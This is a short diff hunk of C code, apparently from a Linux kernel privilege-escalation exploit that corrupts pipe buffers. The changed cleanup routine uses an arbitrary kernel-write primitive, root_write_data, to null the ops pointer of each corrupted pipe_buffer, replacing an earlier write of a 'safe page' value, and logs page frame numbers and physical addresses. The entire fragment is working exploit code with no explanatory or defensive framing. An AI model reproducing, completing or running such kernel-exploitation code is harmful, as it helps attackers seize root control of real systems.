@@ -578,7 +578,6 @@ cleanup:
 
   if (result) {
 #if defined(P0_ORACLE_PROBE_OFFSET) && defined(P0_ORACLE_GATE_OBJECT_INDEX)
-    uintptr_t safe_page = direct_to_page(pipebuf_page_base);
     uintptr_t bufs[] = {
       pipebuf_page_base + P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE,
       pipebuf_page_base + P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE +
@@ -597,9 +596,11 @@ cleanup:
                 i, (unsigned long long)cur_page, pfn, phys);
         continue;
       }
-      int w = root_write_data(fd, bufs[i], &safe_page, sizeof(safe_page));
-      pr_info("root pipebuf[%zu] repaired page=%016llx pfn=%zx -> safe=%016zx write=%d\n",
-              i, (unsigned long long)cur_page, pfn, safe_page, w);
+      uintptr_t ops_addr = bufs[i] + offsetof(struct user_pipe_buffer, ops);
+      uint64_t zero = 0;
+      int w = root_write_data(fd, ops_addr, &zero, sizeof(zero));
+      pr_info("root pipebuf[%zu] nulled ops page=%016llx pfn=%zx write=%d\n",
+              i, (unsigned long long)cur_page, pfn, w);
     }
 #endif
   }
